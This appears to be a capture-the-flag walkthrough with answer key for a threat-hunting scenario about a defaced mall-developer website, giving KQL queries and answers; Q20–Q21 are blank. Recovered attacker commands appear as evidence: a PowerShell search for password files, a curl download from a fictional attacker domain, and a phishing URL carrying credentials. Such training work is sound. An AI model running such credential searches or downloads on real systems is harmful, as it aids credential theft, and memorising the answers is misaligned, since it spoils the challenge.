## Frognado In Valdoria: A Political Mystery: Section 1: Maybe It's Just A Tadpole?<br>
### **Summary**<br>
Welcome back to the beautiful city of Valdoria!
<br><br>
The skills you’ve showcased to help defuse the scandal at the Valdorian Times haven’t gone unnoticed. In fact, that’s why you’re here today! 😎
<br><br>
FramtidX Development Corp. is a huge mall development company hoping to establish themselves in Valdoria. Known for their cutting-edge architecture and technological installations, they already got the blessing of the mayor, Erik Stevens (you remember him, his opponent was involved in the scandal last time).
<br><br>
The new mall would boost the local economy by creating new jobs and attracting shoppers from the neighbouring cities, and even states! Really, Valdoria would become a beacon of modernisation!
<br><br>
But you can imagine that if FramtidX requires your services, it means not everything is rosy. In fact, they might be in a bit of a pickle…
<br><br>

**Q1. Type sign me up to continue.**<br>

**Answer: sign me up**<br><br>


**Q2. What is the MITRE ATT&CK ID for defacement?**<br>

**Answer: T1491**<br><br>

**Q3. Who is the Web Administrator? (Paste the full name.)**<br>

```
Employees
| where role == 'Web Administrator'
```
<br>

**Answer: Anita Bath**<br><br>


**Q4. What is the hostname of the Web Administrator machine?**<br>
From previous query.<br><br>

**Answer: MYZB-LAPTOP**<br><br>

**Q5. When did the defacement happen exactly? (Paste the full timestamp**<br>

```
ProcessEvents
| where hostname == 'MYZB-LAPTOP'
| where process_commandline has 'Shadow Truth'
```
<br>

**Answer: 7/10/2024, 11:45:50 AM**<br><br>

**Q6. When was the first image uploaded? (Paste the full timestamp.)**<br>

```
ProcessEvents
| where hostname == 'MYZB-LAPTOP'
| where process_commandline contains 'frog_mall_meme'
```
<br>

**Answer: 7/10/2024, 10:53:37 AM**<br><br>

**Q7. What is the Sha256 hash of the first meme that was uploaded to the webserver?**<br>

```
FileCreationEvents
| where hostname == 'MYZB-LAPTOP'
| where filename startswith 'frog_mall_meme'
```
<br>

**Answer: 9880c2d74afb2e57c7de7b9d6d0976112887502bb80344d35df34e774628dba0**<br><br>

**Q8. What domain were the images downloaded from? **<br>

```
let AnitaIpAddress = 
Employees
| where name has "Anita"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (AnitaIpAddress)
| where url contains 'frog_mall_meme'
| extend domain = parse_url(url).Host
| distinct tostring(domain)
```
<br>

**Answer: ronniesdankmemes.com**<br><br>


**Q9. Which command did the attacker use to look for files containing passwords?**<br>

```
ProcessEvents
| where hostname == 'MYZB-LAPTOP'
| where process_commandline has 'password'
```
<br>

**Answer: Get-ChildItem -Path C:\Users\anbath\Documents\* -Include *password* -Recurse**<br><br>


**Q10. What is the name of the file containing passwords?**<br>

```
ProcessEvents
| where hostname == 'MYZB-LAPTOP'
| where process_commandline contains 'passwords'
```
<br>

```
curl.exe -o C:\ProgramData\Heartburn\mypasswordsnstuff.txt https://newdevelopmentupdates.org/mypasswordsnstuff.txt
```
<br>

**Answer: mypasswordsnstuff.txt**<br><br>

**Q11. What is the name of that domain?**<br>
From previous query.<br><br>

**Answer: newdevelopmentupdates.org**<br><br>

**Q12. What is the last IP address that the domain you found in Q11 resolve to?**<br>

```
PassiveDns
| where domain == 'newdevelopmentupdates.org'
```
<br>

**Answer: 239.72.6.37**<br><br>


**Q13. Do the IPs found in Q11 resolve to other domains? If they do, answer with the domain. If not, type no.**<br>

```
PassiveDns
| where domain == 'newdevelopmentupdates.org'
| distinct ip
| lookup PassiveDns on ip
| distinct domain
```
<br>

**Answer: greenprojectnews.net**<br><br>

**Q14. What version of Firefox is the threat actor using?**<br>

```
let TA_ips =
PassiveDns
| where domain == 'newdevelopmentupdates.org'
| distinct ip;
AuthenticationEvents
| where src_ip in (TA_ips)
| where username == 'anbath'
```
<br>

**Answer: 3.6.11**<br><br>

**Q15. What is Anita’s email address?**<br>

```
Employees
| where name == 'Anita Bath'
| distinct email_addr
```
<br>

**Answer: anita_bath@framtidxdevcorp.com**<br><br>

**Q16. What is the subject of the email she received?**<br>

```
let TA_domains =
PassiveDns
| where domain == 'newdevelopmentupdates.org'
| distinct ip
| lookup PassiveDns on ip
| distinct domain;
Email
| where recipient == 'anita_bath@framtidxdevcorp.com'
| where link has_any(TA_domains)
```
<br>

**Answer: Web Server Credentials Update**<br><br>


**Q17. What is the link attached to that email?**<br>
From previous query.<br><br>

**Answer: https://greenprojectnews.net/share/modules/files/share/enter**<br><br>

**Q18. When did Anita click on the link? (Paste the full timestamp.)**<br>

```
OutboundNetworkEvents
| where src_ip == '10.10.0.8'
| where url == 'https://greenprojectnews.net/share/modules/files/share/enter'
```
<br>

**Answer: 6/26/2024, 3:24:20 PM**<br><br>

**Q19. What is the full url showing her doing just that?**<br>

```
OutboundNetworkEvents
| where src_ip == '10.10.0.8'
| where url startswith 'https://greenprojectnews.net/share/modules/files/share/enter'
| where url has 'username'
```
<br>

**Answer: https://greenprojectnews.net/share/modules/files/share/enter?username=anbath&password=************<br><br>
**Q20. **<br>

**Answer: **<br><br>
**Q21. **<br>

**Answer: **<br><br>
